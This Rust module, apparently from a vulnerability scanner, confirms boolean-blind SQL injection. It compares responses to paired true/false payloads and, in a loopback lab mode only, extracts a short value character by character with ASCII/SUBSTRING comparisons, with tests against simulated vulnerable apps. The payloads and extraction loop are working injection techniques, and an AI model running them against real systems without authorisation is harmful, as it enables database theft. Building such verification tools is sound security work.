//! Oráculo diferencial de INYECCIÓN (booleano) — el gemelo de `oraculo_diferencial`
//! (authz) para SQLi, y el arreglo del punto ciego que nombraba
//! `nexus-verificacion-por-string-no-por-ejecucion`: hasta ahora SQLi/cmdi se daban por
//! confirmados INTERPRETANDO el stdout de sqlmap/commix (`verify::interpret_sqlmap`),
//! o sea confiando en la palabra de la herramienta por match de cadena. Esto confirma
//! por EJECUCIÓN con control positivo Y negativo, como hace el mejor competidor whitebox
//! (Shannon/Keygraph): *"si el payload verdadero y el falso devuelven lo mismo → no es
//! inyectable"* (su `identical responses → FALSE POSITIVE`), y *"proof by construction"*
//! — la prueba es la DIFERENCIA de comportamiento, no el veredicto del escáner.
//!
//! El truco de discriminación (y el control negativo por construcción): los payloads
//! verdadero (`… AND 1=1`) y falso (`… AND 1=2`) tienen la MISMA longitud y forma; solo
//! difieren en un dígito. Una app NO inyectable los trata como cadenas literales iguales
//! → respuestas indistinguibles → `Solido`. Si el booleano SÍ cambia la respuesta, la
//! diferencia es semántica de SQL, no del texto del payload (y un simple reflejo del
//! parámetro difiere en ~1 carácter, que la tolerancia absorbe). Reutiliza el
//! `Certificado` anti-slop y la barandilla de scope de `oraculo_diferencial`.

use crate::certificado::Certificado;
use crate::oraculo_diferencial::{guardia, Modo, Objetivo};

/// Escalera de prueba de explotación — método extraído de Shannon (Keygraph) y ADAPTADO
/// al estatuto detector de nexus ([[nexus-detector-ataca-para-encontrar]]). Shannon la
/// recorre hasta la EXFILTRACIÓN (extraer datos reales, volcar credenciales); nexus
/// adopta la escalera pero **pone el techo donde manda "sin perjudicar"**:
///   - **Vivo (blackbox):** máximo `EstructuraManipulada` (L2) — se prueba el CANAL, no
///     se extraen datos de nadie. Demostrar que *se podría* leer es prueba suficiente
///     para el reporte; extraer los datos de un tercero es el daño que NO se hace.
///   - **Lab propio (whitebox):** se permite `ExtraccionProbada` (L3) — no hay víctima.
///
/// Y como en Shannon: **el nivel de prueba NO es la severidad** (un L2 puede ser crítico;
/// un L3, bajo). El nivel dice cuán concluyente es la evidencia, no cuánto importa.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum NivelPrueba {
    /// L1: punto de inyección confirmado (error/timing/variación de respuesta).
    PuntoConfirmado,
    /// L2: estructura de la consulta manipulada — el booleano ciego responde: CANAL probado.
    EstructuraManipulada,
    /// L3: extracción de un dato demostrada. SOLO lab whitebox (sin víctima).
    ///
    /// IMPLEMENTADO en `extraer_demostrador` (boolean-blind, SOLO lab whitebox por estatuto), CON
    /// disciplina de estado de NACIMIENTO (veta x64dbg-mcp #2, ver
    /// `conocimiento/patrones/disciplina-de-estado.md`): NO hereda como aún válidos el punto de
    /// inyección ni el baseline de L2 — entre confirmar el CANAL (L2) y extraer un dato (L3) el
    /// objetivo pudo moverse (sesión caducada, WAF que se cae, backend reiniciado). Antes de cada
    /// comparación, `canal_vivo` RE-VERIFICA que el canal sigue discriminando; si se movió, se
    /// ABORTA sin afirmar (un dato «extraído» sobre un canal muerto es basura que se ve como dato).
    /// Caso rojo `l3_aborta_si_el_canal_se_cierra_a_mitad` (mutante sin re-verificación → extrae
    /// basura). Es un DEMOSTRADOR acotado (N chars), no un dump: probar que el canal exfiltra.
    ExtraccionProbada,
}

impl NivelPrueba {
    pub fn nivel(self) -> u8 {
        match self {
            NivelPrueba::PuntoConfirmado => 1,
            NivelPrueba::EstructuraManipulada => 2,
            NivelPrueba::ExtraccionProbada => 3,
        }
    }
    pub fn descripcion(self) -> &'static str {
        match self {
            NivelPrueba::PuntoConfirmado => "punto de inyección confirmado",
            NivelPrueba::EstructuraManipulada => "estructura de consulta manipulada (canal booleano probado)",
            NivelPrueba::ExtraccionProbada => "extracción de dato demostrada (lab)",
        }
    }
}

/// Techo de rompimiento POR ESTATUTO. Vivo = probar el canal (L2); lab = extracción (L3).
/// Es la barandilla "sin daño" hecha código: sobre un objetivo real nunca se pasa de L2.
pub fn techo_por_estatuto(modo: Modo) -> NivelPrueba {
    match modo {
        Modo::Blackbox => NivelPrueba::EstructuraManipulada,
        Modo::Whitebox => NivelPrueba::ExtraccionProbada,
    }
}

/// Un caso de inyección a probar: el parámetro `param` de `ruta` con un valor normal
/// `valor_base`. El oráculo construye por sí mismo los pares verdadero/falso.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct CasoInyeccion {
    pub descripcion: String,
    /// Clase para el reporte/certificado (normalmente "sqli").
    pub clase: String,
    /// Ruta relativa con el parámetro inyectable (p. ej. `/buscar`).
    pub ruta: String,
    /// Nombre del parámetro de query a inyectar (p. ej. `id`).
    pub param: String,
    /// Valor normal del parámetro (baseline / control positivo), p. ej. `1`.
    pub valor_base: String,
    /// Cabeceras de autenticación opcionales (si el endpoint las exige).
    #[serde(default)]
    pub cabeceras: Vec<(String, String)>,
}

#[derive(Debug, Clone)]
pub enum Veredicto {
    /// El booleano cambia la respuesta de forma reproducible → SQLi confirmada, con el
    /// NIVEL de prueba alcanzado (topado por el estatuto según el modo).
    Inyectable(Certificado, NivelPrueba),
    /// Verdadero y falso son indistinguibles → la app no evalúa el booleano (sano).
    Solido,
    /// Los controles no discriminan (baseline caído, o el payload verdadero rompe la
    /// página → error-based ruidoso, no booleano limpio). Se redondea a la baja.
    NoConcluyente(String),
}

/// Percent-encoding mínimo del valor del parámetro (no de toda la URL).
fn enc(s: &str) -> String {
    let mut o = String::with_capacity(s.len() * 3);
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => o.push(b as char),
            _ => o.push_str(&format!("%{b:02X}")),
        }
    }
    o
}

/// Firma de una respuesta: (status, longitud del cuerpo). Es lo que se compara para
/// decidir "igual" o "distinto" — barato y estable.
async fn firma(
    cli: &reqwest::Client,
    base: &str,
    ruta: &str,
    param: &str,
    valor: &str,
    cabeceras: &[(String, String)],
) -> Result<(u16, usize), String> {
    let url = format!("{}{}?{}={}", base.trim_end_matches('/'), ruta, param, enc(valor));
    let mut req = cli.get(&url);
    for (k, v) in cabeceras {
        req = req.header(k.as_str(), v.as_str());
    }
    let resp = req.send().await.map_err(|e| e.to_string())?;
    let status = resp.status().as_u16();
    let body = resp.text().await.map_err(|e| e.to_string())?;
    Ok((status, body.len()))
}

/// ¿Dos firmas son "iguales"? Mismo status y longitud dentro de tolerancia. La
/// tolerancia (≥40 y 2%) absorbe el reflejo del propio payload (difiere en ~1 char)
/// sin tragarse una diferencia booleana real (filas vs sin-filas, cientos de bytes).
fn iguales(a: (u16, usize), b: (u16, usize)) -> bool {
    if a.0 != b.0 {
        return false;
    }
    let (la, lb) = (a.1 as i64, b.1 as i64);
    let tol = 40.max((la.max(lb) as f64 * 0.02) as i64);
    (la - lb).abs() <= tol
}

/// Los pares (verdadero, falso) por contexto de inyección. Misma longitud dentro de
/// cada par: la diferencia entre respuestas solo puede venir de la semántica SQL.
fn pares(valor_base: &str) -> Vec<(&'static str, String, String)> {
    vec![
        ("string", format!("{valor_base}' AND '1'='1"), format!("{valor_base}' AND '1'='2")),
        ("numérico", format!("{valor_base} AND 1=1"), format!("{valor_base} AND 1=2")),
        ("comentario", format!("{valor_base}' AND '1'='1'-- -"), format!("{valor_base}' AND '1'='2'-- -")),
    ]
}

/// EL RUNNER booleano. Corre el diferencial verdadero/falso `intentos` veces por cada
/// contexto; el primer contexto que discrimina de forma reproducible (n/n) gana.
pub async fn sonda_booleana(
    cli: &reqwest::Client,
    objetivo: &Objetivo,
    caso: &CasoInyeccion,
    intentos: usize,
) -> Veredicto {
    let intentos = intentos.max(1);
    let base = &objetivo.base;

    // Control positivo: el baseline (valor normal) debe responder 2xx y con cuerpo.
    let base_sig = match firma(cli, base, &caso.ruta, &caso.param, &caso.valor_base, &caso.cabeceras).await {
        Ok(s) => s,
        Err(e) => return Veredicto::NoConcluyente(format!("baseline no respondió: {e}")),
    };
    if !(200..400).contains(&base_sig.0) || base_sig.1 == 0 {
        return Veredicto::NoConcluyente(format!(
            "baseline no es un control válido (status {}, {} bytes): no medimos nada",
            base_sig.0, base_sig.1
        ));
    }

    let mut vio_ruido = false;
    for (ctx, pl_true, pl_false) in pares(&caso.valor_base) {
        let mut hits = 0usize;
        let mut roto = false;
        for _ in 0..intentos {
            // DISCIPLINA DE ESTADO (veta x64dbg-mcp #2, ver conocimiento/patrones/
            // disciplina-de-estado.md): el baseline —la referencia de "el verdadero se comporta
            // como el normal"— se RE-ANCLA cada ronda, pareado con el par verdadero/falso, en vez
            // de congelarse en t0. Si la página deriva a mitad (timestamp, banner, balanceador,
            // caché), el verdadero sigue al normal VIVO y se separaría del baseline rancio → la
            // inyección real se PERDERÍA (falso negativo). Medido junto a la sonda, la referencia
            // es del mismo instante.
            let base_live = match firma(cli, base, &caso.ruta, &caso.param, &caso.valor_base, &caso.cabeceras).await {
                Ok(s) => s,
                Err(_) => {
                    roto = true;
                    break;
                }
            };
            // El baseline re-anclado tiene que seguir siendo un control válido; si se cayó a
            // mitad (status fuera de 2xx/3xx o cuerpo vacío), no medimos nada.
            if !(200..400).contains(&base_live.0) || base_live.1 == 0 {
                return Veredicto::NoConcluyente(format!(
                    "el baseline dejó de ser válido a mitad de la corrida (status {}, {} bytes): \
                     el objetivo se desestabilizó; no se afirma sobre una referencia que se movió",
                    base_live.0, base_live.1
                ));
            }
            let ft = match firma(cli, base, &caso.ruta, &caso.param, &pl_true, &caso.cabeceras).await {
                Ok(s) => s,
                Err(_) => {
                    roto = true;
                    break;
                }
            };
            let ff = match firma(cli, base, &caso.ruta, &caso.param, &pl_false, &caso.cabeceras).await {
                Ok(s) => s,
                Err(_) => {
                    roto = true;
                    break;
                }
            };
            // Señal de inyección: el verdadero se comporta como el baseline (query
            // válida) y el falso DIVERGE. Exigir ~baseline en el verdadero descarta el
            // ruido de una página de error (error-based), que difiere de todo.
            if iguales(ft, base_live) && !iguales(ft, ff) {
                hits += 1;
            } else if !iguales(ft, base_live) && !iguales(ft, ff) {
                // El payload "verdadero" rompió la página: hay efecto, pero no es un
                // booleano limpio. Se anota como ruido y se redondea a la baja.
                vio_ruido = true;
            }
        }
        if roto {
            continue;
        }
        if hits == intentos {
            // El booleano ciego reproducible prueba el CANAL: nivel 2 (estructura
            // manipulada). El techo por estatuto nunca lo rebaja (L2 ≤ techo en ambos
            // modos); en whitebox una fase de extracción podría subirlo a L3, aún no
            // implementada (se deja como demostración de lab, no se cruza en vivo).
            let nivel = NivelPrueba::EstructuraManipulada.min(techo_por_estatuto(objetivo.modo));
            let cert = Certificado {
                execution_confirmed: true,
                repro_ratio: Some(format!("{hits}/{intentos}")),
                diferencial: true, // verdadero-vs-falso de igual longitud ES el control
                evidencia_presente: true,
                herramienta: Some(format!("oraculo-inyeccion-booleano:{ctx}")),
                confianza: Some("high".into()),
                clase: caso.clase.clone(),
                ancla: format!(
                    "nexus v{} · inyección-booleana/{ctx} · nivel-prueba {} ({})",
                    env!("CARGO_PKG_VERSION"),
                    nivel.nivel(),
                    nivel.descripcion()
                ),
            };
            return Veredicto::Inyectable(cert, nivel);
        }
    }

    if vio_ruido {
        Veredicto::NoConcluyente(
            "el payload verdadero altera la página pero sin patrón booleano limpio \
             (posible error-based); no se afirma sin un control diferencial nítido"
                .into(),
        )
    } else {
        // Verdadero y falso indistinguibles en todo contexto → la app no evalúa el
        // booleano (Shannon: identical responses ⇒ no es inyectable).
        Veredicto::Solido
    }
}

/// Puerta de scope + runner: aplica la barandilla de `oraculo_diferencial::guardia`
/// (whitebox solo loopback, blackbox solo en scope) ANTES de tocar nada.
pub async fn confirmar(
    cli: &reqwest::Client,
    objetivo: &Objetivo,
    caso: &CasoInyeccion,
    scope: &[String],
    intentos: usize,
) -> Result<Veredicto, String> {
    guardia(objetivo, scope)?;
    Ok(sonda_booleana(cli, objetivo, caso, intentos).await)
}

// ─────────────────────────────────────────────────────────────────────────────────────────────
// L3 — ExtraccionProbada (boolean-blind), SOLO lab whitebox, CON disciplina de estado de NACIMIENTO
// ─────────────────────────────────────────────────────────────────────────────────────────────

/// El resultado de una extracción L3. Demostrador por EJECUCIÓN, no un dump.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Extraccion {
    /// Un demostrador leído por ejecución: el canal exfiltra de verdad (L3 alcanzado).
    Extraido { valor: String, nivel: NivelPrueba },
    /// DISCIPLINA DE ESTADO (D33): el canal dejó de discriminar DURANTE la extracción. No se
    /// afirma un valor a medio-leer sobre un canal que se movió; se devuelve lo parcial y el
    /// motivo. Es el invariante de nacimiento de L3: NO heredar el canal de L2, re-confirmarlo
    /// en cada paso.
    Abortada { motivo: String, parcial: String },
    /// Sobre un objetivo VIVO no se extrae (estatuto detector: probar el canal, nunca robar los
    /// datos de un tercero). L3 solo corre en lab whitebox (loopback).
    RechazadaPorEstatuto,
}

/// La comparación boolean-blind: ¿el char en `pos` (1-based) del valor de `expr_sql` tiene
/// ASCII > `n`? Pura; un backend SQL evalúa el AND y devuelve fila (true) o no-fila (false).
fn payload_comparacion(valor_base: &str, expr_sql: &str, pos: usize, n: u8) -> String {
    format!("{valor_base}' AND ASCII(SUBSTRING(({expr_sql}),{pos},1))>{n}")
}

/// DISCIPLINA DE ESTADO — la re-verificación que el invariante de L3 exige. ¿El canal SIGUE
/// discriminando AHORA? Re-ancla el baseline y exige que un control conocido-verdadero (`'1'='1`)
/// se parezca al baseline y uno conocido-falso (`'1'='2`) diverja. Devuelve el baseline VIVO si
/// discrimina, o `None` si el canal se movió a mitad. Se llama ANTES de confiar en cada
/// comparación: un char «extraído» leyendo un canal muerto es basura que se ve como dato.
async fn canal_vivo(
    cli: &reqwest::Client,
    objetivo: &Objetivo,
    caso: &CasoInyeccion,
) -> Option<(u16, usize)> {
    let base = &objetivo.base;
    let base_live = firma(cli, base, &caso.ruta, &caso.param, &caso.valor_base, &caso.cabeceras)
        .await
        .ok()?;
    if !(200..400).contains(&base_live.0) || base_live.1 == 0 {
        return None;
    }
    let ct = format!("{}' AND '1'='1", caso.valor_base);
    let cf = format!("{}' AND '1'='2", caso.valor_base);
    let ctrl_true = firma(cli, base, &caso.ruta, &caso.param, &ct, &caso.cabeceras).await.ok()?;
    let ctrl_false = firma(cli, base, &caso.ruta, &caso.param, &cf, &caso.cabeceras).await.ok()?;
    (iguales(ctrl_true, base_live) && !iguales(ctrl_false, base_live)).then_some(base_live)
}

/// Extrae un DEMOSTRADOR de `long` caracteres del valor apuntado por `expr_sql`, por
/// boolean-blind binary search. SOLO lab whitebox (estatuto). La disciplina de estado es de
/// NACIMIENTO: antes de cada comparación se re-confirma el canal (`canal_vivo`); si deja de
/// discriminar, se ABORTA sin afirmar (no se hereda el canal de L2 ni el del char anterior).
pub async fn extraer_demostrador(
    cli: &reqwest::Client,
    objetivo: &Objetivo,
    caso: &CasoInyeccion,
    expr_sql: &str,
    long: usize,
) -> Extraccion {
    // ESTATUTO: la extracción solo se demuestra en lab propio (loopback). Nunca sobre un vivo.
    if objetivo.modo != Modo::Whitebox {
        return Extraccion::RechazadaPorEstatuto;
    }
    let base = &objetivo.base;
    let mut valor = String::new();
    for pos in 1..=long {
        // Búsqueda binaria del ASCII del char en el rango imprimible [31, 126]; 31 = sentinela
        // "por debajo de imprimible" → fin del valor.
        let (mut lo, mut hi) = (31u16, 126u16);
        while lo < hi {
            let mid = ((lo + hi) / 2) as u8;
            // DISCIPLINA DE ESTADO: re-verificar el canal ANTES de creer la comparación.
            let base_live = match canal_vivo(cli, objetivo, caso).await {
                Some(b) => b,
                None => {
                    return Extraccion::Abortada {
                        motivo: format!(
                            "el canal dejó de discriminar en el char {pos} (umbral {mid}): el \
                             objetivo se movió a mitad; no afirmo un valor a medio-leer"
                        ),
                        parcial: valor,
                    }
                }
            };
            let pl = payload_comparacion(&caso.valor_base, expr_sql, pos, mid);
            let cmp = match firma(cli, base, &caso.ruta, &caso.param, &pl, &caso.cabeceras).await {
                Ok(s) => s,
                Err(_) => {
                    return Extraccion::Abortada {
                        motivo: format!("error de red extrayendo el char {pos}"),
                        parcial: valor,
                    }
                }
            };
            // char > mid  ⇔  la comparación es TRUE  ⇔  la respuesta se parece al baseline VIVO.
            if iguales(cmp, base_live) {
                lo = mid as u16 + 1;
            } else {
                hi = mid as u16;
            }
        }
        // `lo` es el ASCII del char; ≤31 = no imprimible → fin del valor.
        if !(32..=126).contains(&lo) {
            break;
        }
        valor.push(lo as u8 as char);
    }
    if valor.is_empty() {
        return Extraccion::Abortada {
            motivo: "no se extrajo ningún carácter imprimible".into(),
            parcial: valor,
        };
    }
    Extraccion::Extraido { valor, nivel: NivelPrueba::ExtraccionProbada }
}

#[cfg(test)]
mod pruebas {
    use super::*;
    use crate::oraculo_diferencial::Modo;
    use axum::{http::Uri, routing::get, Router};
    use tokio::net::TcpListener;

    /// Decodifica percent-encoding y `+` de un valor de query (el axum vendorizado no
    /// trae la feature `query`, así que se parsea a mano en las pruebas).
    fn pct_decode(s: &str) -> String {
        let b = s.as_bytes();
        let mut out = Vec::with_capacity(b.len());
        let mut i = 0;
        while i < b.len() {
            match b[i] {
                b'%' if i + 2 < b.len() => {
                    let h = |c: u8| (c as char).to_digit(16);
                    match (h(b[i + 1]), h(b[i + 2])) {
                        (Some(a), Some(c)) => {
                            out.push((a * 16 + c) as u8);
                            i += 3;
                        }
                        _ => {
                            out.push(b[i]);
                            i += 1;
                        }
                    }
                }
                b'+' => {
                    out.push(b' ');
                    i += 1;
                }
                other => {
                    out.push(other);
                    i += 1;
                }
            }
        }
        String::from_utf8_lossy(&out).into_owned()
    }

    /// Extrae `id` del query string crudo, ya decodificado.
    fn id_de(uri: &Uri) -> String {
        uri.query()
            .unwrap_or("")
            .split('&')
            .find_map(|kv| kv.strip_prefix("id="))
            .map(pct_decode)
            .unwrap_or_default()
    }

    // App VULNERABLE: simula SQL booleano. El parámetro `id` se concatena a una query;
    // si el booleano evalúa verdadero (1=1) hay fila (cuerpo largo), si es falso (1=2)
    // no hay fila (cuerpo corto). El valor base "1" da fila (baseline normal).
    async fn vulnerable(uri: Uri) -> String {
        let id = id_de(&uri);
        let bool_true = id.contains("1=1") || id.contains("'1'='1");
        let bool_false = id.contains("1=2") || id.contains("'1'='2");
        let hay_fila = if bool_false {
            false
        } else if bool_true {
            true
        } else {
            // literal: solo el id numérico "1" existe
            id == "1"
        };
        if hay_fila {
            format!("<table><tr><td>usuario 1: Ana Restrepo, ana@ejemplo.co, saldo 4200</td></tr></table> {}", "x".repeat(300))
        } else {
            "<p>Sin resultados.</p>".into()
        }
    }

    // App SEGURA: parámetro parametrizado — el id se trata como CADENA literal, el
    // booleano nunca se evalúa. Cualquier payload no-numérico → "sin resultados",
    // idéntico para verdadero y falso.
    async fn segura(uri: Uri) -> String {
        let id = id_de(&uri);
        if id == "1" {
            format!("<table><tr><td>usuario 1: Ana Restrepo</td></tr></table> {}", "x".repeat(300))
        } else {
            "<p>Sin resultados.</p>".into()
        }
    }

    // App VULNERABLE que además DERIVA: es inyectable (igual que `vulnerable`), pero tras la
    // primera petición (el baseline de t0) toda respuesta crece 250 bytes —un banner/timestamp/
    // caché que cambia la longitud sin cambiar el status—. La semántica booleana se mantiene
    // (verdadero≈normal, falso diverge), solo se desplaza la línea base. Es el estado que un
    // baseline congelado en t0 no ve, y que le hace PERDER una inyección real.
    async fn vulnerable_con_deriva(
        uri: Uri,
        axum::extract::State(n): axum::extract::State<std::sync::Arc<std::sync::atomic::AtomicUsize>>,
    ) -> String {
        let c = n.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        let id = id_de(&uri);
        let bool_true = id.contains("1=1") || id.contains("'1'='1");
        let bool_false = id.contains("1=2") || id.contains("'1'='2");
        let hay_fila = if bool_false {
            false
        } else if bool_true {
            true
        } else {
            id == "1"
        };
        // Deriva: activa desde la 2ª petición en adelante (la 1ª es el baseline de t0).
        let deriva = if c >= 1 { "y".repeat(250) } else { String::new() };
        if hay_fila {
            format!(
                "<table><tr><td>usuario 1: Ana Restrepo, ana@ejemplo.co, saldo 4200</td></tr></table> {}{}",
                "x".repeat(300),
                deriva
            )
        } else {
            format!("<p>Sin resultados.</p>{deriva}")
        }
    }

    async fn levantar(app: Router) -> (String, tokio::task::JoinHandle<()>) {
        let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base = format!("http://{}", l.local_addr().unwrap());
        let h = tokio::spawn(async move { axum::serve(l, app).await.unwrap(); });
        (base, h)
    }

    fn caso() -> CasoInyeccion {
        CasoInyeccion {
            descripcion: "SQLi booleana en id".into(),
            clase: "sqli".into(),
            ruta: "/buscar".into(),
            param: "id".into(),
            valor_base: "1".into(),
            cabeceras: vec![],
        }
    }

    // --- L3: lab que SIMULA un backend SQL para la extracción boolean-blind ---
    const SECRETO_LAB: &[u8] = b"S3c"; // el demostrador que el lab "esconde"

    /// Parsea `ASCII(SUBSTRING((expr),{pos},1))>{n}` del id inyectado (lo que emite
    /// `payload_comparacion`), devolviendo (pos, n). Es lo que un backend SQL evaluaría.
    fn parse_ascii_cmp(id: &str) -> Option<(usize, u8)> {
        let marca = "ASCII(SUBSTRING(";
        let resto = &id[id.find(marca)? + marca.len()..]; // "(expr),{pos},1))>{n}…"
        let (izq, der) = resto.split_once(",1))>")?; // izq="(expr),{pos}" der="{n}…"
        let pos: usize = izq.rsplit(',').next()?.trim().parse().ok()?;
        let n: u8 = der.chars().take_while(|c| c.is_ascii_digit()).collect::<String>().parse().ok()?;
        Some((pos, n))
    }

    /// Evalúa el `id` inyectado como lo haría el backend: controles `'1'='1`/`'1'='2`, la
    /// comparación ASCII contra el secreto, y el baseline literal "1". Devuelve si hay FILA.
    fn evaluar_sql(id: &str, secreto: &[u8]) -> bool {
        if id.contains("'1'='2") {
            return false;
        }
        if id.contains("'1'='1") {
            return true;
        }
        if let Some((pos, n)) = parse_ascii_cmp(id) {
            return secreto
                .get(pos.wrapping_sub(1))
                .is_some_and(|&c| c as u16 > n as u16);
        }
        id == "1"
    }

    fn cuerpo(presente: bool) -> String {
        if presente {
            format!("<table><tr><td>fila</td></tr></table> {}", "x".repeat(300))
        } else {
            "<p>Sin resultados.</p>".into()
        }
    }

    // Lab SQLi estable: extrae de verdad el secreto.
    async fn laboratorio_sqli(uri: Uri) -> String {
        cuerpo(evaluar_sql(&id_de(&uri), SECRETO_LAB))
    }

    #[tokio::test]
    async fn l3_extrae_un_demostrador_en_lab_whitebox() {
        let (base, _h) = levantar(Router::new().route("/buscar", get(laboratorio_sqli))).await;
        let cli = reqwest::Client::new();
        let obj = Objetivo { base, modo: Modo::Whitebox };
        match extraer_demostrador(&cli, &obj, &caso(), "secreto", 3).await {
            Extraccion::Extraido { valor, nivel } => {
                assert_eq!(valor, "S3c", "el demostrador se extrae char a char por ejecución");
                assert_eq!(nivel, NivelPrueba::ExtraccionProbada);
            }
            otro => panic!("esperaba Extraido, fue {otro:?}"),
        }
    }

    #[tokio::test]
    async fn l3_rechaza_extraccion_sobre_vivo_por_estatuto() {
        // Blackbox = vivo: L3 NO extrae (estatuto). Ni siquiera toca el servidor.
        let (base, _h) = levantar(Router::new().route("/buscar", get(laboratorio_sqli))).await;
        let cli = reqwest::Client::new();
        let obj = Objetivo { base, modo: Modo::Blackbox };
        assert_eq!(
            extraer_demostrador(&cli, &obj, &caso(), "secreto", 3).await,
            Extraccion::RechazadaPorEstatuto
        );
    }

    #[tokio::test]
    async fn l3_aborta_si_el_canal_se_cierra_a_mitad() {
        // CASO ROJO (D33) de la disciplina de estado de NACIMIENTO de L3: el canal discrimina al
        // principio y se CIERRA a mitad (deja de mostrar fila a nada). Con `canal_vivo`
        // re-verificando cada paso → Abortada (no se afirma un valor a medio-leer). Sin esa
        // re-verificación (el mutante) se seguiría "leyendo" un canal muerto → un valor basura.
        use std::sync::{atomic::{AtomicUsize, Ordering}, Arc};
        async fn lab_que_se_cierra(
            uri: Uri,
            axum::extract::State(n): axum::extract::State<Arc<AtomicUsize>>,
        ) -> String {
            let c = n.fetch_add(1, Ordering::SeqCst);
            // Tras 20 peticiones el canal se cierra: todo da "sin resultados" (deja de discriminar).
            if c >= 20 {
                return cuerpo(false);
            }
            cuerpo(evaluar_sql(&id_de(&uri), SECRETO_LAB))
        }
        let estado = Arc::new(AtomicUsize::new(0));
        let app = Router::new()
            .route("/buscar", get(lab_que_se_cierra))
            .with_state(estado);
        let (base, _h) = levantar(app).await;
        let cli = reqwest::Client::new();
        let obj = Objetivo { base, modo: Modo::Whitebox };
        let r = extraer_demostrador(&cli, &obj, &caso(), "secreto", 3).await;
        assert!(
            matches!(r, Extraccion::Abortada { .. }),
            "un canal que se cierra a mitad NO se afirma como valor extraído; debe Abortar, fue {r:?}"
        );
    }

    #[tokio::test]
    async fn app_vulnerable_da_inyectable_con_certificado_valido() {
        let (base, _h) = levantar(Router::new().route("/buscar", get(vulnerable))).await;
        let cli = reqwest::Client::new();
        let obj = Objetivo { base, modo: Modo::Whitebox };
        match sonda_booleana(&cli, &obj, &caso(), 3).await {
            Veredicto::Inyectable(cert, nivel) => {
                assert!(cert.es_valido(), "el hallazgo debe traer certificado válido");
                assert_eq!(cert.repro_ratio.as_deref(), Some("3/3"));
                assert!(cert.diferencial);
                // Vivo o lab, el booleano llega a L2 (canal probado).
                assert_eq!(nivel, NivelPrueba::EstructuraManipulada);
            }
            otro => panic!("esperaba Inyectable, fue {otro:?}"),
        }
    }

    #[tokio::test]
    async fn app_inyectable_que_deriva_a_mitad_sigue_siendo_inyectable() {
        // CASO ROJO (D33) de la disciplina de estado en oraculo_inyeccion: app inyectable cuya
        // línea base se desplaza 250 bytes tras t0. Con el baseline RE-ANCLADO cada ronda →
        // Inyectable (la referencia es del mismo instante que la sonda). Con el baseline
        // congelado en t0 (el mutante = versión anterior) el verdadero deja de "parecerse al
        // baseline" y la inyección se PIERDE → NoConcluyente/Solido: falso negativo.
        use std::sync::{atomic::AtomicUsize, Arc};
        let estado = Arc::new(AtomicUsize::new(0));
        let app = Router::new()
            .route("/buscar", get(vulnerable_con_deriva))
            .with_state(estado);
        let (base, _h) = levantar(app).await;
        let cli = reqwest::Client::new();
        let obj = Objetivo { base, modo: Modo::Whitebox };
        let v = sonda_booleana(&cli, &obj, &caso(), 3).await;
        assert!(
            matches!(v, Veredicto::Inyectable(..)),
            "una inyección real no se pierde porque la página derive a mitad; debe salir \
             Inyectable, fue {v:?}"
        );
    }

    #[test]
    fn techo_del_estatuto_topa_el_rompimiento() {
        // Sobre un objetivo VIVO nunca se pasa de probar el canal (sin extraer datos).
        assert_eq!(techo_por_estatuto(Modo::Blackbox), NivelPrueba::EstructuraManipulada);
        // En el lab propio se permite demostrar extracción (sin víctima).
        assert_eq!(techo_por_estatuto(Modo::Whitebox), NivelPrueba::ExtraccionProbada);
        assert!(NivelPrueba::EstructuraManipulada < NivelPrueba::ExtraccionProbada);
    }

    // CASO ROJO (directiva 33): la app segura NO debe dar Inyectable. Falla por la vía
    // real — verdadero y falso producen la misma respuesta (control negativo por
    // construcción). Si esto diera Inyectable, el oráculo estaría "diciendo que sí a
    // todo" (justo el fallo que Shannon evita con "identical responses → FP").
    #[tokio::test]
    async fn app_segura_da_solido() {
        let (base, _h) = levantar(Router::new().route("/buscar", get(segura))).await;
        let cli = reqwest::Client::new();
        let obj = Objetivo { base, modo: Modo::Whitebox };
        let v = sonda_booleana(&cli, &obj, &caso(), 3).await;
        assert!(matches!(v, Veredicto::Solido), "la app parametrizada es sólida, fue {v:?}");
    }

    #[tokio::test]
    async fn baseline_caido_da_no_concluyente() {
        // Ruta que no existe → baseline 404 → no medimos nada.
        let (base, _h) = levantar(Router::new().route("/otra", get(segura))).await;
        let cli = reqwest::Client::new();
        let obj = Objetivo { base, modo: Modo::Whitebox };
        let v = sonda_booleana(&cli, &obj, &caso(), 3).await;
        assert!(matches!(v, Veredicto::NoConcluyente(_)), "baseline caído → no concluyente, fue {v:?}");
    }

    #[tokio::test]
    async fn guardia_bloquea_fuera_de_scope() {
        let cli = reqwest::Client::new();
        let obj = Objetivo { base: "https://ajeno.com".into(), modo: Modo::Blackbox };
        assert!(confirmar(&cli, &obj, &caso(), &["target.com".into()], 3).await.is_err());
    }
}
